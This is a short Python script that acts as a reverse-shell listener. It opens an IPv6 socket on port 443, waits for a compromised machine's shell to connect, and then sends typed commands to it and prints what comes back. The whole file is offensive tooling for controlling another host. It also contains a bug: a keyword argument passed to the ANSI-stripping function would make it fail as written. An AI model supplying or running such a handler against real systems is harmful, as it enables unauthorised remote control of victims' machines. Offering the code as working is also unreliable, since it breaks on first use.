import socket
import sys
import re

def strip_ansi(text):
    """Remove ANSI escape sequences"""
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    return ansi_escape.sub('', text)

def listen():
    s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    # Listen on all IPv6 interfaces, port 443
    s.bind(("::", 443, 0, 0))  # "::" is IPv6 wildcard
    s.listen(1)
    
    print("[*] Listening on [::]:443 (IPv6)...")
    print("[*] Waiting for reverse shell to connect...\n")
    
    conn, addr = s.accept()
    print(f"[+] Connection from {addr[0]}")
    
    # Interactive loop
    while True:
        try:
            # Get command from user
            cmd = input("$ ")

            if cmd.lower() == "exit":
                conn.send(b"exit\n")
                break
            
            # Send command to target
            conn.send((cmd + "\n").encode())
            
            # Give shell time to execute and return output
            import time
            time.sleep(0.2)  # ← ADD small delay
            
            # Receive output from target
            output = conn.recv(4096)
            clean_output = strip_ansi(output.decode(errors='ignore'), end='')
            print(clean_output)
        
        except KeyboardInterrupt:
            print("\n[*] Exiting...")
            break
        except Exception as e:
            print(f"[!] Error: {e}")
            break
    
    conn.close()
    s.close()

if __name__ == "__main__":
    listen()